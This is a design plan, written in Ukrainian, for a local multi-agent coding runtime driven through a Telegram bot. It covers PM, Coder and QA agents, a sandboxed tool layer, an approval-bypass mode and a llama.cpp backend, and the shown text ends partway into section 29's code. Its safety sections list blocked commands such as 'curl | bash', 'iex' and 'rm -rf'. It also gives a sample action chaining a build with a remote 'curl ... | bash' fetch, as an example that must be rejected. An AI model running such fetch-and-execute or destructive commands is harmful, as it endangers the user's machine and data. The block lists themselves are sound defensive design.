# AI Telegram Team Runtime — повний plan.md

## 0. Назва проєкту

Робоча назва:

```text
AI Telegram Team Runtime
```

Скорочено:

```text
AI Team Runtime
```

Суть:

```text
Локальна multi-agent система, яка працює через Telegram як живий AI-розробницький чат.
```

Користувач пише повідомлення природною мовою:

```text
Зроби сторінку логіну на React і Tailwind
```

або:

```text
Перевір чому не білдиться проєкт
```

або:

```text
Як там прогрес?
```

Система сама розуміє, що треба зробити, запускає agent workflow і відповідає як людина.

---

## 1. Головна ідея

Потрібно зробити не просто Telegram-бота і не просто 3 промпти, а власний локальний Hermes-style runtime без використання Hermes.

Тобто всередині має бути:

```text
Telegram Chat / Telegram Bot Interface
  ↓
Conversation Router
  ↓
Main Orchestrator
  ↓
Sub-Agent Pool
  ├── PM Agent
  ├── Coder Agent
  ├── QA Agent
  ├── Git Agent
  ├── Docs Agent
  └── Final Summary Agent
  ↓
Tool Layer
  ├── read_file
  ├── write_file
  ├── patch_file
  ├── run_command
  ├── git_diff
  ├── git_status
  ├── project_search
  └── project_summary
  ↓
LLM Provider
  └── llama.cpp server
  ↓
Workspace
  └── локальний проєкт користувача
```

Важливе рішення для старту:

```text
У першій робочій версії використовується 1 Telegram bot.
```

Цей один bot є входом у систему й передає всі повідомлення в один центральний runtime:

```text
Telegram Bot
  ↓
Central Runtime
  ├── Conversation Router
  ├── Main Orchestrator
  ├── PM Agent
  ├── Coder Agent
  ├── QA Agent
  └── Tool Layer
```

PM, Coder і QA на старті не є окремими Telegram-ботами. Це логічні агенти всередині runtime. Так простіше тримати єдиний стан задачі, пам'ять, workspace, права на tools і QA loop.

Для користувача bot може відповідати від імені агентів:

```text
PM: Склав план, передаю Coder.
Coder: Вніс зміни, передаю QA.
QA: Перевіряю build і diff.
```

Пізніше можна покращити UX через Telegram group mode або кілька bot personas, але всі вони все одно мають ходити в один центральний runtime.

Головна формула:

```text
Одна локальна модель
+
багато логічних sub-agents
+
природний Telegram chat
+
approval bypass для безпечних дій
+
жорсткий sandbox/workspace guard
+
QA loop
```

---

## 2. Що означає “як Hermes”, але без Hermes

Система має працювати як agent runtime:

- є головний orchestrator;
- є окремі sub-agents;
- кожен агент має свою роль;
- кожен агент має свої tools;
- агенти не мають прямого доступу до файлової системи;
- усі дії проходять через Tool Layer;
- orchestrator контролює workflow;
- задачі мають state machine;
- є пам'ять задачі;
- є прогрес-апдейти;
- є QA loop;
- є логування;
- є робота з workspace;
- є approval bypass режим.

Це не має бути так:

```text
run_llm(PM_PROMPT)
run_llm(CODER_PROMPT)
run_llm(QA_PROMPT)
```

Це занадто просто.

Правильно так:

```text
Main Orchestrator
  ├── викликає PM Agent
  ├── передає план Coder Agent
  ├── виконує tools, які просить Coder
  ├── запускає QA Agent
  ├── якщо QA FAIL — повертає задачу Coder
  ├── якщо QA PASS — запускає Final PM Agent
  └── надсилає користувачу людську відповідь
```

---

## 3. Важливе UX-рішення: без `/task`

Користувач не повинен писати:

```text
/task зроби сторінку логіну
```

Основний режим — природний чат.

Користувач пише:

```text
Зроби сторінку логіну на React і Tailwind
```

Система сама визначає:

```json
{
  "intent": "new_task",
  "confidence": 0.95
}
```

Користувач пише:

```text
Як там?
```

Система сама визначає:

```json
{
  "intent": "status_request",
  "confidence": 0.98
}
```

Користувач пише:

```text
Покажи що ти змінив
```

Система сама визначає:

```json
{
  "intent": "show_diff",
  "confidence": 0.96
}
```

Користувач пише:

```text
Стоп, не чіпай App.tsx
```

Система визначає:

```json
{
  "intent": "task_clarification",
  "confidence": 0.93,
  "constraint": "Не змінювати App.tsx"
}
```

Slash-команди можуть існувати тільки як fallback:

```text
/start
/help
/status
/stop
```

Але основна взаємодія має бути як із людиною.

## 3.1. Один Telegram bot, але з прямим зверненням до агентів

На старті в Telegram працює один bot, але користувач може напряму звертатися до логічних агентів:

```text
QA, перевір ще раз чи нормальна архітектура
```

```text
Coder, поясни чому ти змінив App.tsx
```

```text
PM, розбий це на етапи
```

Система визначає це як пряме звернення до агента:

```json
{
  "intent": "direct_agent_message",
  "target_agent": "qa",
  "message": "перевір ще раз чи нормальна архітектура"
}
```

Це дає UX як у команди, але без складності трьох окремих Telegram-ботів.

Правило:

```text
1 Telegram bot = один контрольований вхід у систему
PM/Coder/QA = логічні agents всередині runtime
```

У майбутньому можна додати Telegram group mode:

```text
Telegram Group
  ├── User
  ├── AI Team Bot
  └── optional visual personas: PM / Coder / QA
```

Або ще пізніше:

```text
PM Bot ┐
Coder Bot ├── Central Runtime
QA Bot ┘
```

Але навіть якщо з'являться окремі Telegram-боти, вони не повинні мати власну незалежну логіку. Вони мають бути тільки зовнішніми інтерфейсами до одного central runtime.

---

## 4. Approval bypass mode

## 4.1. Що хоче користувач

Користувач не хоче кожен раз підтверджувати:

```text
Так, застосовуй
```

Тому система має працювати в режимі:

```text
APPROVAL_MODE=bypass
```

Це означає:

```text
AI сама застосовує безпечні зміни
AI сама запускає безпечні команди перевірки
AI сама проходить цикл Coder → QA → Fix → QA
AI сама доходить до фінального результату
```

Користувач має отримувати не купу питань, а нормальні апдейти:

```text
Беру в роботу.
```

```text
План готовий, переходжу до реалізації.
```

```text
Зміни застосовано, QA перевіряє build.
```

```text
QA знайшов одну проблему, виправляю.
```

```text
Готово, перевірка пройшла.
```

---

## 4.2. Що approval bypass дозволяє автоматично

У режимі approval bypass система може сама:

- читати файли в workspace;
- створювати нові файли в workspace;
- змінювати існуючі файли в workspace;
- застосовувати patch;
- запускати безпечні build/test/lint команди;
- запускати `git diff`;
- запускати `git status`;
- створювати локальні task logs;
- повторювати Coder ↔ QA loop;
- робити локальні форматування, якщо команда відома і безпечна;
- оновлювати task memory;
- відповідати користувачу про прогрес.

---

## 4.3. Що approval bypass НЕ дозволяє автоматично

Навіть у bypass mode система не повинна автоматично:

- видаляти весь проєкт;
- працювати поза workspace;
- змінювати системні директорії;
- запускати небезпечні shell-команди;
- публікувати пакети;
- робити git push;
- робити force push;
- видаляти git history;
- змінювати `.env` без окремого правила;
- читати/зливати секрети;
- запускати команди типу `curl | bash`;
- запускати PowerShell `iex`;
- видаляти файли масово;
- форматувати диски;
- зупиняти або перезавантажувати ПК;
- змінювати налаштування ОС.

Тобто:

```text
approval bypass ≠ повний root-доступ
approval bypass = автоматичне виконання безпечних dev-дій у workspace
```

---

## 4.4. Рівні дій у bypass mode

Дії треба поділити на рівні ризику.

### SAFE

Виконуються автоматично.

```text
read_file
list_files
project_search
git_status
git_diff
write_file у workspace
patch_file у workspace
create_file у workspace
npm run build
npm test
npm run lint
go test ./...
python -m pytest
```

### CAUTION

Можуть виконуватися автоматично тільки якщо явно дозволені в конфігу.

```text
npm install
pnpm install
yarn install
pip install
go mod tidy
npm run format
eslint --fix
prettier --write
```

### DANGEROUS

Не виконуються автоматично.

```text
git push
git push --force
npm publish
rm -rf
del /s /q
git clean -fdx
format
shutdown
reboot
curl | bash
Invoke-WebRequest ... | iex
```

---

## 4.5. Конфіг approval bypass

У `.env`:

```env
APPROVAL_MODE=bypass

BYPASS_ALLOW_FILE_WRITE=true
BYPASS_ALLOW_PATCH=true
BYPASS_ALLOW_CREATE_FILE=true
BYPASS_ALLOW_RUN_BUILD=true
BYPASS_ALLOW_RUN_TEST=true
BYPASS_ALLOW_RUN_LINT=true

BYPASS_ALLOW_PACKAGE_INSTALL=false
BYPASS_ALLOW_GIT_COMMIT=false
BYPASS_ALLOW_GIT_PUSH=false
BYPASS_ALLOW_ENV_EDIT=false
BYPASS_ALLOW_DELETE_FILE=false

MAX_CHANGED_FILES_PER_TASK=20
MAX_FILE_SIZE_TO_EDIT_KB=300
MAX_COMMAND_TIMEOUT_SECONDS=120
```

Рекомендація для старту:

```text
file write: true
patch: true
build/test/lint: true
package install: false
git commit: false
git push: false
delete file: false
.env edit: false
```

---

## 5. Поточний LLM backend

Користувач запускає модель через `llama.cpp`.

Поточний приклад `.bat`:

```bat
@echo off
title Gemma 4 12B QAT + MTP + Vision
cd /d D:\llama

echo ========================================
echo Gemma 4 12B QAT + MTP + Vision
echo ========================================
echo.

llama-server.exe ^
  -m "D:\llm models\lmstudio-community\gemma-4-12B-it-QAT-GGUF\gemma-4-12B-it-QAT-Q4_0.gguf" ^
  --mmproj "D:\llm models\lmstudio-community\gemma-4-12B-it-QAT-GGUF\mmproj-gemma-4-12B-it-QAT-BF16.gguf" ^
  --model-draft "D:\llm models\Janvitos\gemma-4-12B-it-qat-assistant-MTP-Q8_0-GGUF\gemma-4-12B-it-qat-assistant-MTP-Q8_0.gguf" ^
  --spec-type draft-mtp ^
  --spec-draft-n-max 4 ^
  --ctx-size 65536 ^
  --temp 1.0 ^
  --top-p 0.95 ^
  --top-k 64 ^
  --n-gpu-layers 999 ^
  --cache-type-k q8_0 ^
  --cache-type-v q8_0 ^
  --flash-attn on ^
  --parallel 1 ^
  --host 127.0.0.1 ^
  --port 8081

pause
```

LLM API:

```text
http://127.0.0.1:8081/v1/chat/completions
```

Рекомендація:

```text
--parallel 1 для старту
--ctx-size 32768 або 65536 для стабільності
```

---

## 6. Чому одна модель може обслуговувати багато agents

Одна модель — це не один агент.

Модель — це inference backend.

Agents — це логічні ролі:

```text
PM Agent     → один system prompt + allowed tools
Coder Agent  → інший system prompt + allowed tools
QA Agent     → інший system prompt + allowed tools
Final PM     → інший system prompt + allowed tools
```

Фізично:

```text
усі звертаються до одного llama.cpp server
```

Логічно:

```text
це різні агенти з різними правилами
```

На старті agents працюють послідовно:

```text
PM → Coder → QA → Coder fix → QA → Final PM
```

Тому `--parallel 1` нормальний.

Пізніше можна додати `--parallel 2`, якщо треба обробляти кілька незалежних задач одночасно.

---

## 7. Natural language interaction

## 7.1. Нова задача

Користувач:

```text
Зроби адаптивну сторінку логіну на React і Tailwind
```

Система:

```text
Окей, беру в роботу. Спочатку швидко розкладу задачу, потім внесу зміни й перевірю білд.
```

Всередині:

```text
Router → new_task
Orchestrator → create task
PM Agent → plan
Coder Agent → code/actions
Tool Layer → apply automatically
QA Agent → check
Final PM → summary
```

---

## 7.2. Статус задачі

Користувач:

```text
Як там?
```

Система:

```text
Зараз задача на етапі QA. Зміни вже застосовані, перевіряю build. Якщо щось впаде — одразу відправлю Coder на виправлення.
```

---

## 7.3. Уточнення

Користувач:

```text
Тільки не чіпай головну сторінку
```

Система:

```text
Прийняв. Додаю обмеження: головну сторінку не змінювати. Передам це Coder і QA.
```

Всередині:

```json
{
  "constraints": [
    "Не змінювати головну сторінку"
  ]
}
```

---

## 7.4. Показ змін

Користувач:

```text
Покажи що змінилось
```

Система:

```text
Змінені файли:
- src/pages/LoginPage.tsx
- src/App.tsx

Коротко:
- додано LoginPage;
- підключено route /login;
- додано базову валідацію.
```

---

## 7.5. Скасування

Користувач:

```text
Стоп
```

або:

```text
Скасуй задачу
```

Система:

```text
Зупинив активну задачу. Уже застосовані зміни не відкочую автоматично, але можу показати diff або підготувати rollback.
```

---

## 8. Conversation Router

Conversation Router визначає intent кожного повідомлення.

Список intent:

```text
new_task
task_clarification
status_request
show_diff
cancel_task
workspace_change
direct_agent_message
general_chat
approval
rejection
rollback_request
unknown
```

Навіть якщо approval bypass увімкнений, `approval` і `rejection` лишаються потрібними для спеціальних випадків.

---

## 8.1. Rule-based router для MVP

На старті можна зробити прості правила.

### new_task

Тригери:

```text
зроби
створи
додай
реалізуй
перероби
виправ
перевір
знайди помилку
збілди
запусти
```

### status_request

Тригери:

```text
як там
що по задачі
є прогрес
статус
на якому етапі
що вже зроблено
```

### show_diff

Тригери:

```text
покажи зміни
що змінилось
diff
які файли
що ти змінив
```

### cancel_task

Тригери:

```text
стоп
скасуй
зупини
не продовжуй
```

### workspace_change

Тригери:

```text
працюй з проєктом
workspace
папка проєкту
ось шлях
D:\
C:\
```

### direct_agent_message

Тригери:

```text
PM,
Project Manager,
Coder,
Кодер,
QA,
Тестувальник,
питання до QA
питання до Coder
питання до PM
```

Приклад:

```text
QA, перевір чи Coder не зламав існуючу логіку
```

Результат:

```json
{
  "intent": "direct_agent_message",
  "target_agent": "qa",
  "message": "перевір чи Coder не зламав існуючу логіку",
  "references_active_task": true
}
```

---

## 8.2. LLM Router Agent для V2

Пізніше додати Router Agent.

Prompt:

```text
Ти Conversation Router.

Твоя задача — класифікувати повідомлення користувача.
Не виконуй задачу.
Не пиши пояснення.
Поверни тільки JSON.

Можливі intent:
- new_task
- task_clarification
- status_request
- show_diff
- cancel_task
- workspace_change
- direct_agent_message
- general_chat
- approval
- rejection
- rollback_request
- unknown
```

Output:

```json
{
  "intent": "new_task",
  "confidence": 0.94,
  "extracted_task": "Зробити сторінку логіну на React і Tailwind",
  "references_active_task": false,
  "constraints": []
}
```

---

## 8.3. Hybrid router

Найкращий варіант:

```text
1. Спочатку rule-based router
2. Якщо confidence високий — використовуємо результат
3. Якщо confidence низький — викликаємо LLM Router Agent
```

Це швидше і дешевше.

---

## 9. Main Orchestrator

Main Orchestrator — головний керівник системи.

Він відповідає за:

- прийом intent;
- створення задачі;
- запуск PM Agent;
- запуск Coder Agent;
- виконання tool actions;
- запуск QA Agent;
- повторний loop після FAIL;
- final summary;
- progress updates;
- task memory;
- workspace safety;
- approval bypass policy;
- error handling.

Orchestrator — це код, а не LLM.

Він має бути передбачуваний.

---

## 10. State machine задачі

Стани:

```text
idle
understanding_message
task_created
pm_planning
coding
applying_changes
qa_checking
qa_failed
qa_passed
final_summary
completed
cancelled
failed
timeout
```

У режимі approval bypass стан `waiting_for_approval` не є основним.

Але він може існувати для небезпечних дій, якщо система вирішить не блокувати їх одразу.

Базовий flow:

```text
idle
  ↓
understanding_message
  ↓
task_created
  ↓
pm_planning
  ↓
coding
  ↓
applying_changes
  ↓
qa_checking
  ↓
qa_failed → coding
  ↓
qa_passed
  ↓
final_summary
  ↓
completed
```

---

## 11. Task Object

```json
{
  "id": "task_2026_06_29_001",
  "chat_id": 123456,
  "user_id": 123456,
  "workspace": "D:\\TEST\\cake-web",
  "raw_user_message": "Зроби сторінку логіну",
  "normalized_task": "Create a React + TypeScript + Tailwind login page",
  "status": "coding",
  "round": 1,
  "max_rounds": 3,
  "approval_mode": "bypass",
  "constraints": [
    "Не змінювати головну сторінку"
  ],
  "pm_plan": "...",
  "coder_results": [],
  "qa_results": [],
  "tool_results": [],
  "changed_files": [
    "src/pages/LoginPage.tsx",
    "src/App.tsx"
  ],
  "build_output": "...",
  "final_summary": "...",
  "created_at": "2026-06-29T22:00:00",
  "updated_at": "2026-06-29T22:05:00"
}
```

---

## 12. Sub-Agent architecture

Кожен агент — окрема логічна сутність.

Agent має:

- name;
- role;
- description;
- system prompt;
- allowed tools;
- forbidden tools;
- output schema;
- temperature;
- memory scope;
- max retries.

---

## 12.1. Agent Card

```yaml
name: Coder Agent
role: coder
description: Пише і змінює код у workspace
model_provider: local_llama
temperature: 0.2
memory_scope: task
allowed_tools:
  - list_files
  - read_file
  - write_file
  - patch_file
  - git_diff
forbidden_tools:
  - delete_file
  - git_push
  - npm_publish
  - system_shutdown
output_format: structured_json
```

---

## 12.2. PM Agent

Задача PM Agent:

- зрозуміти повідомлення користувача;
- нормалізувати задачу;
- врахувати workspace;
- врахувати constraints;
- скласти план;
- визначити Criteria of Done;
- визначити ризики;
- не писати код.

Allowed tools:

```text
list_files
read_file
project_summary
```

Prompt:

```text
Ти PM Agent у локальній AI-команді.

Твоя задача:
- перетворити природне повідомлення користувача на чітку технічну задачу;
- врахувати активний workspace;
- врахувати constraints користувача;
- скласти короткий, конкретний план;
- визначити Criteria of Done;
- визначити ризики;
- не писати код;
- не вигадувати зайві фічі.

Формат відповіді:

{
  "normalized_task": "...",
  "plan": [
    "..."
  ],
  "files_likely_affected": [
    "..."
  ],
  "criteria_of_done": [
    "..."
  ],
  "risks": [
    "..."
  ]
}
```

---

## 12.3. Coder Agent

Задача Coder Agent:

- виконати план PM;
- працювати тільки в межах workspace;
- поважати constraints;
- читати потрібні файли;
- генерувати structured actions;
- не запускати shell напряму;
- не пояснювати зайвого;
- повертати конкретні зміни.

Allowed tools:

```text
list_files
read_file
write_file
patch_file
git_diff
project_search
```

Forbidden tools:

```text
delete_file
git_push
npm_publish
system_command_unrestricted
```

Prompt:

```text
Ти Coder Agent у локальній AI-команді.

Твоя задача:
- виконати план PM;
- працювати тільки в межах workspace;
- не змінювати файли, які користувач заборонив;
- не вигадувати зайву архітектуру;
- повертати зміни у форматі structured actions;
- писати чистий код;
- якщо треба прочитати файл — попроси read_file;
- якщо треба змінити файл — поверни patch_file або write_file action;
- не запускай shell-команди самостійно;
- не видаляй файли;
- не змінюй .env без прямого дозволу.

Формат відповіді:

{
  "message": "...",
  "actions": [
    {
      "type": "read_file",
      "path": "..."
    }
  ],
  "notes": "..."
}
```

---

## 12.4. QA Agent

Задача QA Agent:

- перевірити виконання задачі;
- перевірити відповідність плану PM;
- перевірити constraints;
- перевірити changed files;
- перевірити git diff;
- перевірити build/test/lint output;
- повернути PASS або FAIL.

Allowed tools:

```text
read_file
git_diff
git_status
run_command
```

Prompt:

```text
Ти QA Agent у локальній AI-команді.

Твоя задача:
- строго перевірити результат Coder Agent;
- перевірити відповідність задачі користувача;
- перевірити Criteria of Done;
- перевірити, що constraints не порушені;
- проаналізувати git diff;
- проаналізувати build/test/lint output;
- якщо все добре — повернути PASS;
- якщо є проблеми — повернути FAIL і конкретні required_fixes.

Формат PASS:

{
  "status": "PASS",
  "verified": [
    "..."
  ],
  "notes": "..."
}

Формат FAIL:

{
  "status": "FAIL",
  "problems": [
    "..."
  ],
  "required_fixes": [
    "..."
  ]
}
```

---

## 12.5. Final PM Agent

Задача:

- відповісти користувачу як людина;
- коротко пояснити, що зроблено;
- сказати, чи QA пройшов;
- показати змінені файли;
- не показувати сирий JSON;
- не засипати логами.

Prompt:

```text
Ти Final PM Agent.

Твоя задача:
- відповісти користувачу природною мовою;
- коротко підсумувати виконану роботу;
- згадати QA-перевірку;
- показати список змінених файлів;
- якщо задача виконана частково — чесно сказати це;
- не використовувати занадто технічний стиль, якщо користувач цього не просить.

Формат:

Готово, зробив ...

Що змінилось:
- ...

Перевірка:
- ...

Файли:
- ...

Що далі:
...
```

---

## 13. Tool Layer

Tool Layer — безпечна прокладка між agents і системою.

Agent ніколи не змінює файли напряму.

Правильний flow:

```text
Coder Agent повертає action
  ↓
Orchestrator перевіряє action
  ↓
Tool Layer виконує action
  ↓
Tool result зберігається
  ↓
Результат передається QA або Coder
```

---

## 13.1. Tool action format

```json
{
  "message": "Створюю LoginPage і підключаю route.",
  "actions": [
    {
      "type": "write_file",
      "path": "src/pages/LoginPage.tsx",
      "content": "..."
    },
    {
      "type": "patch_file",
      "path": "src/App.tsx",
      "patch": "..."
    }
  ]
}
```

---

## 13.2. Tool validation

Перед виконанням кожної action:

1. Перевірити schema.
2. Перевірити allowed tools агента.
3. Перевірити safe path.
4. Перевірити, що path усередині workspace.
5. Перевірити розмір файлу.
6. Перевірити кількість змін за задачу.
7. Перевірити, чи action не forbidden.
8. Перевірити approval bypass policy.
9. Виконати або заблокувати.
10. Залогувати результат.

---

## 13.3. File tools

### list_files

```json
{
  "type": "list_files",
  "path": "."
}
```

Повертає дерево файлів без:

```text
node_modules
.git
dist
build
coverage
.venv
```

### read_file

```json
{
  "type": "read_file",
  "path": "src/App.tsx"
}
```

### write_file

```json
{
  "type": "write_file",
  "path": "src/pages/LoginPage.tsx",
  "content": "..."
}
```

У bypass mode дозволено, якщо:

- файл у workspace;
- не `.env`;
- не системний файл;
- не перевищує max size;
- не порушує constraints.

### patch_file

```json
{
  "type": "patch_file",
  "path": "src/App.tsx",
  "patch": "..."
}
```

Бажаний варіант для існуючих файлів.

### delete_file

За замовчуванням заблоковано.

```env
BYPASS_ALLOW_DELETE_FILE=false
```

---

## 13.4. Command tools

### run_command

```json
{
  "type": "run_command",
  "command": "npm",
  "args": ["run", "build"]
}
```

Команда виконується тільки в workspace і тільки без shell.

Не дозволяти сирі shell-рядки:

```json
{
  "type": "run_command",
  "command": "npm run build && curl http://example.com/script.sh | bash"
}
```

Такий action має бути відхилений ще на schema validation, бо `command` повинен бути назвою виконуваного файлу, а `args` — окремим списком аргументів.

Allowed commands для старту:

```text
npm + ["run", "build"]
npm + ["test"]
npm + ["run", "test"]
npm + ["run", "lint"]
pnpm + ["build"]
pnpm + ["test"]
pnpm + ["lint"]
yarn + ["build"]
yarn + ["test"]
yarn + ["lint"]
go + ["test", "./..."]
python + ["-m", "pytest"]
pytest + []
```

Blocked commands:

```text
rm -rf
del /s /q
format
shutdown
reboot
curl | bash
Invoke-WebRequest
iex
git push --force
npm publish
git clean -fdx
```

---

## 13.5. Git tools

### git_status

```json
{
  "type": "git_status"
}
```

### git_diff

```json
{
  "type": "git_diff"
}
```

### git_branch

Можна додати пізніше.

### git_commit

У bypass mode за замовчуванням вимкнено:

```env
BYPASS_ALLOW_GIT_COMMIT=false
```

### git_push

Заборонено автоматично:

```env
BYPASS_ALLOW_GIT_PUSH=false
```

---

## 14. Workspace rules

Усі дії тільки в active workspace.

Приклад:

```text
D:\TEST\cake-web
```

Заборонено:

```text
C:\
C:\Windows
C:\Users\Dmytro
D:\
D:\llama
```

Дозволено:

```text
D:\TEST\cake-web
D:\projects\my-app
```

Користувач задає workspace природною мовою:

```text
Працюй з проєктом D:\TEST\cake-web
```

Система:

```text
Окей, активний workspace: D:\TEST\cake-web
```

---

## 15. Memory

Модель не повинна отримувати всю історію.

Пам'ять ділиться на рівні:

```text
Chat memory
Task memory
Project memory
Long-term logs
```

---

## 15.1. Chat memory

Зберігає:

- останні повідомлення;
- активну задачу;
- статус;
- уточнення користувача.

---

## 15.2. Task memory

Зберігає:

- raw user message;
- normalized task;
- constraints;
- PM plan;
- coder outputs;
- tool results;
- QA feedback;
- changed files;
- build output;
- final summary.

---

## 15.3. Project memory

Зберігає:

- workspace path;
- стек проєкту;
- package manager;
- build command;
- test command;
- lint command;
- стиль структури файлів;
- типові folders.

---

## 15.4. Що передавати agents

PM Agent:

```text
user message
workspace summary
constraints
project memory
```

Coder Agent:

```text
normalized task
PM plan
relevant files
constraints
last QA feedback
```

QA Agent:

```text
original task
PM criteria
changed files
git diff
build/test/lint output
constraints
```

Final PM:

```text
task summary
changed files
QA status
important notes
```

---

## 16. Context control

Не передавати в LLM:

```text
весь проєкт
всю історію Telegram
node_modules
dist
build
coverage
всі старі задачі
всі logs
```

Передавати тільки потрібне.

Це не дасть контексту забиватися.

---

## 17. Progress updates

Система має працювати як людина і не мовчати.

Писати апдейти при важливих подіях:

```text
task_created
pm_done
coding_started
changes_applied
qa_started
qa_failed
qa_passed
completed
failed
```

Приклади:

```text
Беру в роботу.
```

```text
План готовий, переходжу до реалізації.
```

```text
Зміни застосував. Тепер QA перевіряє build.
```

```text
QA знайшов одну проблему, виправляю.
```

```text
Перевірка пройшла. Готую фінальний підсумок.
```

Не писати:

```text
Intent detected: new_task
State changed: qa_checking
```

Писати людською мовою.

---

## 18. Chat style

Стиль відповідей:

```text
коротко
по-людськи
спокійно
без зайвої канцелярії
без сирого JSON
без зайвих технічних логів
```

Погано:

```text
QA_STATUS=FAILED, ROUND=1
```

Добре:

```text
QA знайшов одну проблему: білд падає через TypeScript-тип. Виправляю.
```

---

## 19. Error handling

## 19.1. llama.cpp не відповідає

```text
Не можу звернутися до локальної моделі. Перевір, чи запущений llama-server на 127.0.0.1:8081.
```

---

## 19.2. Workspace не заданий

Якщо користувач просить змінити код:

```text
Я можу це зробити, але спочатку треба знати папку проєкту. Напиши, наприклад:
Працюй з проєктом D:\TEST\cake-web
```

---

## 19.3. QA не пройшов після max rounds

```text
Я зробив кілька спроб, але QA досі бачить проблему.

Що вже зроблено:
- ...

Що залишилось:
- ...

Зараз краще або змінити підхід, або показати diff і помилку build.
```

---

## 19.4. Tool action заблокована

```text
Я заблокував цю дію, бо вона виходить за межі workspace або вважається небезпечною.
```

---

## 20. Logging

Для кожної задачі створюється папка:

```text
logs/
└── task_2026_06_29_001/
    ├── user_message.md
    ├── intent.json
    ├── task.json
    ├── pm_plan.json
    ├── coder_round_1.json
    ├── tool_results_round_1.json
    ├── qa_round_1.json
    ├── coder_round_2.json
    ├── tool_results_round_2.json
    ├── qa_round_2.json
    ├── git_diff.patch
    ├── build_output.txt
    ├── final_summary.md
    └── task_summary.md
```

Логи потрібні для:

- дебагу;
- відновлення задачі;
- аналізу якості;
- історії роботи;
- rollback.

---

## 21. Git workflow

На старті git commit автоматично не робити.

У bypass mode дозволено:

```text
git status
git diff
```

Не дозволено автоматично:

```text
git add
git commit
git push
```

Пізніше можна додати:

```env
BYPASS_ALLOW_GIT_COMMIT=true
```

Тоді після QA PASS система може сама робити локальний commit, але push все одно лишити ручним.

Рекомендація для початку:

```text
AI змінює файли
AI запускає build/test
AI показує summary
користувач сам комітить
```

---

## 22. Project structure

```text
ai-team-runtime/
├── .env
├── README.md
├── plan.md
├── requirements.txt
├── main.py
├── app/
│   ├── __init__.py
│   ├── telegram/
│   │   ├── __init__.py
│   │   ├── bot.py
│   │   ├── message_handler.py
│   │   └── message_formatter.py
│   ├── router/
│   │   ├── __init__.py
│   │   ├── conversation_router.py
│   │   ├── rule_router.py
│   │   └── llm_router.py
│   ├── orchestrator/
│   │   ├── __init__.py
│   │   ├── main_orchestrator.py
│   │   ├── task_state.py
│   │   └── task_context.py
│   ├── agents/
│   │   ├── __init__.py
│   │   ├── base_agent.py
│   │   ├── agent_card.py
│   │   ├── pm_agent.py
│   │   ├── coder_agent.py
│   │   ├── qa_agent.py
│   │   ├── final_pm_agent.py
│   │   └── prompts.py
│   ├── llm/
│   │   ├── __init__.py
│   │   ├── base_provider.py
│   │   └── llama_cpp_provider.py
│   ├── tools/
│   │   ├── __init__.py
│   │   ├── tool_registry.py
│   │   ├── file_tools.py
│   │   ├── command_tools.py
│   │   ├── git_tools.py
│   │   └── project_tools.py
│   ├── memory/
│   │   ├── __init__.py
│   │   ├── chat_memory.py
│   │   ├── task_memory.py
│   │   └── project_memory.py
│   ├── storage/
│   │   ├── __init__.py
│   │   ├── db.py
│   │   └── task_repository.py
│   └── utils/
│       ├── __init__.py
│       ├── logger.py
│       ├── safe_paths.py
│       └── text_splitter.py
├── logs/
└── workspaces/
```

---

## 23. `.env`

```env
TELEGRAM_BOT_TOKEN=your_telegram_bot_token

LLAMA_BASE_URL=http://127.0.0.1:8081/v1
LLAMA_MODEL=local-model

DEFAULT_WORKSPACE=D:\TEST\cake-web

MAX_AGENT_ROUNDS=3
MAX_TELEGRAM_MESSAGE_LENGTH=3900

APPROVAL_MODE=bypass

BYPASS_ALLOW_FILE_WRITE=true
BYPASS_ALLOW_PATCH=true
BYPASS_ALLOW_CREATE_FILE=true
BYPASS_ALLOW_RUN_BUILD=true
BYPASS_ALLOW_RUN_TEST=true
BYPASS_ALLOW_RUN_LINT=true

BYPASS_ALLOW_PACKAGE_INSTALL=false
BYPASS_ALLOW_GIT_COMMIT=false
BYPASS_ALLOW_GIT_PUSH=false
BYPASS_ALLOW_ENV_EDIT=false
BYPASS_ALLOW_DELETE_FILE=false

MAX_CHANGED_FILES_PER_TASK=20
MAX_FILE_SIZE_TO_EDIT_KB=300
MAX_COMMAND_TIMEOUT_SECONDS=120

AUTO_PROGRESS_UPDATES=true
ROUTER_MODE=hybrid
WRITE_MODE=bypass
```

---

## 24. requirements.txt

```txt
aiogram
aiohttp
python-dotenv
pydantic
gitpython
```

Опціонально:

```txt
rich
fastapi
uvicorn
sqlalchemy
watchdog
```

---

## 25. Base LLM Provider

```python
class BaseLLMProvider:
    async def chat(self, messages: list[dict], temperature: float = 0.3) -> str:
        raise NotImplementedError
```

---

## 26. llama.cpp Provider

```python
import aiohttp

class LlamaCppProvider:
    def __init__(self, base_url: str, model: str):
        self.base_url = base_url.rstrip("/")
        self.model = model

    async def chat(self, messages: list[dict], temperature: float = 0.3) -> str:
        payload = {
            "model": self.model,
            "messages": messages,
            "temperature": temperature,
            "max_tokens": 4096
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"{self.base_url}/chat/completions",
                json=payload,
                timeout=180
            ) as response:
                data = await response.json()
                return data["choices"][0]["message"]["content"]
```

---

## 27. Base Agent interface

```python
class BaseAgent:
    def __init__(
        self,
        name: str,
        role: str,
        system_prompt: str,
        allowed_tools: list[str],
        llm_provider,
        temperature: float = 0.3,
    ):
        self.name = name
        self.role = role
        self.system_prompt = system_prompt
        self.allowed_tools = allowed_tools
        self.llm = llm_provider
        self.temperature = temperature

    async def run(self, context: str) -> str:
        messages = [
            {
                "role": "system",
                "content": self.system_prompt
            },
            {
                "role": "user",
                "content": context
            }
        ]

        return await self.llm.chat(
            messages=messages,
            temperature=self.temperature
        )
```

---

## 28. Orchestrator pseudo-code

```python
async def handle_message(chat_id: int, user_message: str):
    intent = await conversation_router.detect(
        message=user_message,
        chat_id=chat_id
    )

    if intent.name == "new_task":
        return await start_new_task(chat_id, intent.extracted_task)

    if intent.name == "status_request":
        return await send_status(chat_id)

    if intent.name == "task_clarification":
        return await add_clarification(chat_id, user_message)

    if intent.name == "show_diff":
        return await show_current_diff(chat_id)

    if intent.name == "cancel_task":
        return await cancel_current_task(chat_id)

    if intent.name == "workspace_change":
        return await set_workspace(chat_id, intent.workspace)

    if intent.name == "direct_agent_message":
        return await send_message_to_agent(
            chat_id=chat_id,
            target_agent=intent.target_agent,
            message=intent.message
        )

    if intent.name == "rollback_request":
        return await prepare_rollback(chat_id)

    return await general_chat_response(chat_id, user_message)
```

---

## 29. Task workflow pseudo-code для approval bypass

```python
async def start_new_task(chat_id: int, task_text: str):
    task = task_repository.create(
        chat_id=chat_id,
        task_text=task_text,
        status="pm_planning",
        approval_mode="bypass"
    )

    await telegram.send(chat_id, "Окей, беру в роботу.")

